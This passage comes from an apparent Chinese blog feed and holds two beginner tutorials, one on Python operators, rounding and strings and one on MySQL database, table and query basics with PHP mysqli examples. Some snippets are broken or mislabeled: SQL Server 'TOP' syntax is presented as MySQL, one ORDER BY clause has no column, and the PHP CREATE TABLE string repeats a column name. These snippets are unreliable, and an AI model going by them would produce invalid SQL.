style="text-align:left">运算符</th><th style="text-align:left">描述</th><th style="text-align:center">实例</th></tr></thead><tbody><tr><td style="text-align:left">in</td><td style="text-align:left">如果在指定的序列中找到值返回 True，否则返回 False。</td><td style="text-align:center">x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td style="text-align:left">not in</td><td style="text-align:left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td style="text-align:center">x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><h4 id="身份运算符"><a class="header-anchor" href="#身份运算符">¶</a>身份运算符</h4><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">描述</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:left">is</td><td style="text-align:left">is 是判断两个标识符是不是引用自一个对象</td><td style="text-align:left"><strong>x is y</strong>, 类似 <strong>id(x) == id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td style="text-align:left">is not</td><td style="text-align:left">is not 是判断两个标识符是不是引用自不同对象</td><td style="text-align:left"><strong>x is not y</strong> ， 类似 <strong>id(a) != id(b)</strong>。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><h4 id="运算符优先级"><a class="header-anchor" href="#运算符优先级">¶</a>运算符优先级</h4><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">**</td><td style="text-align:left">指数 (最高优先级)</td></tr><tr><td style="text-align:left">~ + -</td><td style="text-align:left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td style="text-align:left">* / % //</td><td style="text-align:left">乘，除，求余数和取整除</td></tr><tr><td style="text-align:left">+ -</td><td style="text-align:left">加法减法</td></tr><tr><td style="text-align:left">&gt;&gt; &lt;&lt;</td><td style="text-align:left">右移，左移运算符</td></tr><tr><td style="text-align:left">&amp;</td><td style="text-align:left">位 ‘AND’</td></tr><tr><td style="text-align:left">^ |</td><td style="text-align:left">位运算符</td></tr><tr><td style="text-align:left">&lt;= &lt; &gt; &gt;=</td><td style="text-align:left">比较运算符</td></tr><tr><td style="text-align:left">== !=</td><td style="text-align:left">等于运算符</td></tr><tr><td style="text-align:left">= %= /= //= -= += *= **=</td><td style="text-align:left">赋值运算符</td></tr><tr><td style="text-align:left">is is not</td><td style="text-align:left">身份运算符</td></tr><tr><td style="text-align:left">in not in</td><td style="text-align:left">成员运算符</td></tr><tr><td style="text-align:left">not and or</td><td style="text-align:left">逻辑运算符</td></tr></tbody></table><h2 id="数字"><a class="header-anchor" href="#数字">¶</a>数字</h2><h4 id="数字类型转换"><a class="header-anchor" href="#数字类型转换">¶</a>数字类型转换</h4><ul><li><strong>int(x)</strong> 将x转换为一个整数。</li><li><strong>float(x)</strong> 将x转换到一个浮点数。</li><li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li><li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li></ul><p>在整数除法中，除法 <strong>/</strong> 总是返回一个浮点数，如果只想得到整数的结果，丢弃可能的分数部分，可以使用运算符 <strong>//</strong> 。但**//** 得到的并不一定是整数类型的数，它与分母分子的数据类型有关系。</p><h4 id="round（浮点数存储有点奇怪）"><a class="header-anchor" href="#round（浮点数存储有点奇怪）">¶</a>round（浮点数存储有点奇怪）</h4><pre><code class="hljs gauss"><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.4</span>)) <span class="hljs-meta">#10</span><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.5</span>)) <span class="hljs-meta">#10</span><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.6</span>)) <span class="hljs-meta">#11</span></code></pre><p>当个位为奇数，小数部分&gt;=0.5入，其余为舍;当个位为偶数，小数部分&gt;0.5入，其余为舍。</p><h4 id="和-的不同"><a class="header-anchor" href="#和-的不同">¶</a><strong>+=</strong> 和 <strong>=+</strong> 的不同</h4><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-number">5</span><span class="hljs-meta">&gt;&gt;</span>&gt; a += <span class="hljs-number">6</span> <span class="hljs-comment">#与a=a+6效果相同</span><span class="hljs-meta">&gt;&gt;</span>&gt; a<span class="hljs-number">11</span></code></pre><p>对比</p><pre><code class="hljs angelscript">&gt;&gt;&gt; b = +<span class="hljs-number">6</span>  # 其实就是正数，是一个赋值操作，+ <span class="hljs-number">6</span> 即为 +<span class="hljs-number">6</span>，+<span class="hljs-number">6</span> 为 <span class="hljs-number">6</span></code></pre><h2 id="Python-字符串"><a class="header-anchor" href="#Python-字符串">¶</a>Python 字符串</h2><h4 id="字符串更新"><a class="header-anchor" href="#字符串更新">¶</a>字符串更新</h4><pre><code class="hljs routeros">var1 = <span class="hljs-string">&#x27;Hello world!&#x27;</span> <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;已更新字符串 : &quot;</span>, var1[:6] + <span class="hljs-string">&#x27;blackpink!&#x27;</span>)</code></pre><p>输出如下：</p><pre><code class="hljs ada">已更新字符串 :  <span class="hljs-type">Hello</span> blackpink!</code></pre><h4 id="三引号"><a class="header-anchor" href="#三引号">¶</a>三引号</h4><p>允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。</p><pre><code class="hljs python">para_str = <span class="hljs-string">&quot;&quot;&quot;心如花木</span><span class="hljs-string">向阳而生</span><span class="hljs-string">TAB ( \t )</span><span class="hljs-string">也可以使用换行符 [ \n ]</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-keyword">print</span> (para_str)</code></pre><p>输出如下：</p><pre><code class="hljs less">心如花木向阳而生<span class="hljs-selector-tag">TAB</span> (  )也可以使用换行符 <span class="hljs-selector-attr">[ </span><span class="hljs-selector-attr"> ]</span></code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL</title>
    <link href="/2020/10/18/MYSQL/"/>
    <url>/2020/10/18/MYSQL/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><ul><li><a href="#mysql">MySQL</a><ul><li><a href="#mysql%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL创建数据库</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">使用 mysqladmin 创建数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8-php%E8%84%9A%E6%9C%AC-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">使用 PHP脚本 创建数据库</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL 删除数据库</a><ul><li><a href="#drop-%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">drop 命令删除数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">使用 mysqladmin 删除数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">使用PHP脚本删除数据库</a></li></ul></li><li><a href="#mysql-%E9%80%89%E6%8B%A9%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL 选择数据库</a><ul><li><a href="#%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3%E4%B8%AD%E9%80%89%E6%8B%A9">从命令提示窗口中选择</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC">使用PHP脚本</a></li></ul></li><li><a href="#mysql-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL 创建数据表</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E5%88%9B%E5%BB%BA%E8%A1%A8">使用命令提示符创建表</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">使用PHP脚本创建数据表</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL 删除数据表</a></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE">MySQL 删除数据</a></li><li><a href="#mysql-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE">MySQL 查询数据</a><ul><li><a href="#%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">通过命令提示符</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC-1">使用PHP脚本</a></li></ul></li><li><a href="#mysql-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE">MySQL 插入数据</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3">命令提示窗口</a></li></ul></li><li><a href="#mysql%E6%94%B9%E6%95%B0%E6%8D%AE">MySQL改数据</a><br>数据库是按照数据结构来组织、存储和管理数据的仓库。每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</li></ul></li></ul><p>关系数据库管理系统的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><h2 id="MySQL创建数据库"><a href="#MySQL创建数据库" class="headerlink" title="MySQL创建数据库"></a>MySQL创建数据库</h2><p>简单命令如下：数据名为BLACKPINK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysql -u root -p   </span><br><span class="line">Enter password:******  # 登录后进入终端</span><br><span class="line"></span><br><span class="line">mysql&gt; create DATABASE BLACKPINK;</span><br></pre></td></tr></table></figure><h4 id="使用-mysqladmin-创建数据库"><a href="#使用-mysqladmin-创建数据库" class="headerlink" title="使用 mysqladmin 创建数据库"></a>使用 mysqladmin 创建数据库</h4><p>root用户拥有最高权限，可以使用 mysql <strong>mysqladmin</strong> 命令来创建数据库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p create BLACKPINK</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure><p>上述命令创建 MySQL 数据库 BLACKPINK。</p><h4 id="使用-PHP脚本-创建数据库"><a href="#使用-PHP脚本-创建数据库" class="headerlink" title="使用 PHP脚本 创建数据库"></a>使用 PHP脚本 创建数据库</h4><p>PHP 使用 mysqli_query 函数来创建或者删除 MySQL 数据库。</p><p>语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;;  &#x2F;&#x2F; mysql服务器主机地址</span><br><span class="line">$dbuser &#x3D; &#39;root&#39;;            &#x2F;&#x2F; mysql用户名</span><br><span class="line">$dbpass &#x3D; &#39;123456&#39;;          &#x2F;&#x2F; mysql用户名密码</span><br><span class="line">$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#39;连接错误: &#39; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;连接成功&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">$sql &#x3D; &#39;CREATE DATABASE BLACKPINK&#39;;</span><br><span class="line">$retval &#x3D; mysqli_query($conn,$sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;创建数据库失败: &#39; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 BLACKPINK 创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="MySQL-删除数据库"><a href="#MySQL-删除数据库" class="headerlink" title="MySQL 删除数据库"></a>MySQL 删除数据库</h2><h4 id="drop-命令删除数据库"><a href="#drop-命令删除数据库" class="headerlink" title="drop 命令删除数据库"></a>drop 命令删除数据库</h4><p>语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop database 数据库名;</span><br></pre></td></tr></table></figure><h4 id="使用-mysqladmin-删除数据库"><a href="#使用-mysqladmin-删除数据库" class="headerlink" title="使用 mysqladmin 删除数据库"></a>使用 mysqladmin 删除数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p drop BLACKPINK</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure><p>执行以上删除数据库命令后，会出现一个提示框，来确认是否真的删除数据库。</p><h4 id="使用PHP脚本删除数据库"><a href="#使用PHP脚本删除数据库" class="headerlink" title="使用PHP脚本删除数据库"></a>使用PHP脚本删除数据库</h4><p>该命令与创建类似，不同地方在创建时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;CREATE DATABASE BLACKPINK&#39;;</span><br></pre></td></tr></table></figure><p>在删除时变为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;DROP DATABASE BLACKPINK&#39;;</span><br></pre></td></tr></table></figure><p> <strong>但在使用PHP脚本删除数据库时不会出现确认是否删除信息，会直接删除指定数据库。</strong></p><h2 id="MySQL-选择数据库"><a href="#MySQL-选择数据库" class="headerlink" title="MySQL 选择数据库"></a>MySQL 选择数据库</h2><h4 id="从命令提示窗口中选择"><a href="#从命令提示窗口中选择" class="headerlink" title="从命令提示窗口中选择"></a>从命令提示窗口中选择</h4><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysql -u root -p</span><br><span class="line">Enter password:******</span><br><span class="line">mysql&gt; use BLACKPINK;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><strong>所有的数据库名，表名，表字段都是区分大小写的。</strong></p><h4 id="使用PHP脚本"><a href="#使用PHP脚本" class="headerlink" title="使用PHP脚本"></a>使用PHP脚本</h4><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_select_db(connection,dbname);</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;;  &#x2F;&#x2F; mysql服务器主机地址</span><br><span class="line">$dbuser &#x3D; &#39;root&#39;;            &#x2F;&#x2F; mysql用户名</span><br><span class="line">$dbpass &#x3D; &#39;123456&#39;;          &#x2F;&#x2F; mysql用户名密码</span><br><span class="line">$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;连接失败: &#39; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;连接成功&#39;;</span><br><span class="line">mysqli_select_db($conn, &#39;BLACKPINK&#39; );</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="MySQL-创建数据表"><a href="#MySQL-创建数据表" class="headerlink" title="MySQL 创建数据表"></a>MySQL 创建数据表</h2><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name (column_name column_type);</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS &#96;blackpink_tbl&#96;(</span><br><span class="line">   &#96;blackpink_id&#96; INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   &#96;blackpink_title&#96; VARCHAR(100) NOT NULL,</span><br><span class="line">   &#96;blackpink_author&#96; VARCHAR(40) NOT NULL,</span><br><span class="line">   &#96;submission_date&#96; DATE,</span><br><span class="line">   PRIMARY KEY ( &#96;blackpink_id&#96; )</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><ul><li>AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。</li><li>PRIMARY KEY关键字用于定义列为主键。 可以使用多列来定义主键，列间以逗号分隔。</li><li>ENGINE 设置存储引擎，CHARSET 设置编码。</li></ul><h4 id="使用命令提示符创建表"><a href="#使用命令提示符创建表" class="headerlink" title="使用命令提示符创建表"></a>使用命令提示符创建表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use BLACKPINK;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; CREATE TABLE runoob_tbl(</span><br><span class="line">   blackpink_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   blackpink_title VARCHAR(100) NOT NULL,</span><br><span class="line">   blackpink_author VARCHAR(40) NOT NULL,</span><br><span class="line">   submission_date DATE,</span><br><span class="line">   PRIMARY KEY ( blackpink_id )</span><br><span class="line">   )ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h4 id="使用PHP脚本创建数据表"><a href="#使用PHP脚本创建数据表" class="headerlink" title="使用PHP脚本创建数据表"></a>使用PHP脚本创建数据表</h4><p>与创建数据库类似，将$sql处代码换成如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;CREATE TABLE blackpink_tbl( &quot;.</span><br><span class="line">        &quot;blackpink_id INT NOT NULL AUTO_INCREMENT, &quot;.</span><br><span class="line">        &quot;blackpink VARCHAR(100) NOT NULL, &quot;.</span><br><span class="line">        &quot;blackpink VARCHAR(40) NOT NULL, &quot;.</span><br><span class="line">        &quot;submission_date DATE, &quot;.</span><br><span class="line">        &quot;PRIMARY KEY ( blackpink_id ))ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; &quot;;</span><br><span class="line">mysqli_select_db( $conn, &#39;blackpink&#39; );</span><br></pre></td></tr></table></figure><h2 id="MySQL-删除数据表"><a href="#MySQL-删除数据表" class="headerlink" title="MySQL 删除数据表"></a>MySQL 删除数据表</h2><p>语法与创建数据表类似，将create换成drop即可。</p><h2 id="MySQL-删除数据"><a href="#MySQL-删除数据" class="headerlink" title="MySQL 删除数据"></a>MySQL 删除数据</h2><p>删除&lt;满足条件的&gt;行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from &lt;表名&gt; [where &lt;删除条件&gt;]</span><br></pre></td></tr></table></figure><h2 id="MySQL-查询数据"><a href="#MySQL-查询数据" class="headerlink" title="MySQL 查询数据"></a>MySQL 查询数据</h2><p>语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,column_name</span><br><span class="line">FROM table_name</span><br><span class="line">[WHERE Clause]</span><br><span class="line">[LIMIT N][ OFFSET M]</span><br></pre></td></tr></table></figure><ul><li><p>查询语句可以使用一个或者多个表，表之间使用逗号分隔。</p></li><li><p>SELECT 可以读取一条或者多条记录。</p></li><li><p>使用 WHERE 语句来包含任何条件。</p></li><li><p>使用 LIMIT 属性来设定返回的记录数。</p></li><li><p>通过OFFSET指定SELECT语句开始查询的数据偏移量(默认情况下偏移量为0)</p></li></ul><h4 id="通过命令提示符"><a href="#通过命令提示符" class="headerlink" title="通过命令提示符"></a>通过命令提示符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">1.精确（条件）查询</span><br><span class="line">select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;] [order by &lt;排序的列名&gt;[asc或desc]]</span><br><span class="line"></span><br><span class="line">2.查询所有数据行和列</span><br><span class="line">select * from &lt;表&gt;</span><br><span class="line"></span><br><span class="line">3.查询部分行列--条件查询</span><br><span class="line">select i,j,k from a where f&#x3D;5</span><br><span class="line">&#x2F;&#x2F;查询表a中f&#x3D;5的所有行，并显示i,j,k３列</span><br><span class="line"></span><br><span class="line">4.在查询中使用ＡＳ更改列名</span><br><span class="line">select name as 姓名 from a where xingbie&#x3D;&#39;男&#39;</span><br><span class="line">&#x2F;&#x2F;查询a表中性别为男的所有行，显示name列，并将name列改名为（姓名）显示</span><br><span class="line"></span><br><span class="line">5.查询空行</span><br><span class="line">select name from a where email is null</span><br><span class="line">&#x2F;&#x2F;查询表a中email为空的所有行，并显示name列；SQL语句中用is null或者is not null来判断是否为空行</span><br><span class="line"></span><br><span class="line">6.在查询中使用常量</span><br><span class="line">select name, &#39;唐山&#39; as 地址 from Student</span><br><span class="line">&#x2F;&#x2F;查询表a，显示name列，并添加地址列，其列值都为&#39;唐山&#39;</span><br><span class="line"></span><br><span class="line">7.查询返回限制行数</span><br><span class="line">select top 6 name from a</span><br><span class="line">&#x2F;&#x2F;查询表a，显示列name的前６行，top为关键字</span><br><span class="line">select top 60 percent name from a</span><br><span class="line">&#x2F;&#x2F;查询表a，显示列name的60%，percent为关键字</span><br><span class="line"></span><br><span class="line">8.查询排序（关键字：order by , asc , desc）</span><br><span class="line">例：select name from a where chengji&gt;&#x3D;60 order by desc</span><br><span class="line">&#x2F;&#x2F;查询a表中chengji大于等于60的所有行，并按降序显示name列；默认为ＡＳＣ升序</span><br><span class="line"></span><br><span class="line">9.模糊查询</span><br><span class="line">使用like进行模糊查询</span><br><span class="line">注意：like运算副只用于字符串，所以仅与char和varchar数据类型联合使用</span><br><span class="line">select * from a where name like &#39;赵%&#39;</span><br><span class="line">&#x2F;&#x2F;查询显示表a中，name字段第一个字为赵的记录</span><br><span class="line"></span><br><span class="line">使用between在某个范围内进行查询</span><br><span class="line">select * from a where nianling between 18 and 20</span><br><span class="line">&#x2F;&#x2F;查询显示表a中nianling在18到20之间的记录</span><br><span class="line"></span><br><span class="line">使用in在列举值内进行查询</span><br><span class="line">select name from a where address in (&#39;北京&#39;,&#39;上海&#39;,&#39;唐山&#39;)</span><br><span class="line">&#x2F;&#x2F;查询表a中address值为北京或者上海或者唐山的记录，显示name字段</span><br><span class="line"></span><br><span class="line">10.分组查询</span><br><span class="line">使用group by进行分组查询</span><br><span class="line">select studentID as 学员编号,AVG(score) as 平均成绩 (注释:这里的score是列名)</span><br><span class="line">from score (注释:这里的score是表名)</span><br><span class="line">group by studentID</span><br><span class="line">&#x2F;&#x2F;在表score中查询，按strdentID字段分组，显示strdentID字段和score字段的平均值；select语句中只允许被分组的列和为每个分组返回的一个值的表达式，例如用一个列名作为参数的聚合函数</span><br><span class="line"></span><br><span class="line">使用having子句进行分组筛选</span><br><span class="line">select studentID as 学员编号,AVG(score) as 平均成绩 (注释:这里的score是列名)</span><br><span class="line">from score (注释:这里的score是表名)</span><br><span class="line">group by studentID</span><br><span class="line">having count(score)&gt;1</span><br><span class="line">&#x2F;&#x2F;接上面例子，显示分组后count(score)&gt;1的行，由于where只能在没有分组时使用，分组后只能使用having来限制条件。</span><br><span class="line"></span><br><span class="line">11.多表联接查询</span><br><span class="line">内联接：</span><br><span class="line">在where子句中指定联接条件</span><br><span class="line">select a.name,b.chengji from a,b where a.name&#x3D;b.name</span><br><span class="line">&#x2F;&#x2F;查询表a和表b中name字段相等的记录，并显示表a中的name字段和表b中的chengji字段</span><br><span class="line"></span><br><span class="line">在from子句中使用join…on</span><br><span class="line">select a.name,b.chengji from a inner join b on (a.name&#x3D;b.name)</span><br><span class="line"></span><br><span class="line">外联接：</span><br><span class="line">左外联接查询</span><br><span class="line">select s.name,c.courseID,c.score from strdents as s left outer join score as c</span><br><span class="line">on s.scode&#x3D;c.strdentID</span><br><span class="line">&#x2F;&#x2F;在strdents表和score表中查询满足on条件的行，条件为score表的strdentID与strdents表中的sconde相同</span><br><span class="line"></span><br><span class="line">右外联接查询</span><br><span class="line">select s.name,c.courseID,c.score from strdents as s right outer join score as c</span><br><span class="line">on s.scode&#x3D;c.strdentID</span><br><span class="line">&#x2F;&#x2F;在strdents表和score表中查询满足on条件的行，条件为strdents表中的sconde与score表的strdentID相同</span><br></pre></td></tr></table></figure><h4 id="使用PHP脚本-1"><a href="#使用PHP脚本-1" class="headerlink" title="使用PHP脚本"></a>使用PHP脚本</h4><p>使用 <strong>mysqli_query()</strong> 及 <strong>SQL SELECT</strong> 命令来获取数据。</p><p>通过  <strong>mysqli_fetch_array()</strong> 来使用或输出所有查询的数据，该函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有 返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><h2 id="MySQL-插入数据"><a href="#MySQL-插入数据" class="headerlink" title="MySQL 插入数据"></a>MySQL 插入数据</h2><p>插入单行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name ( field1, field2,...fieldN 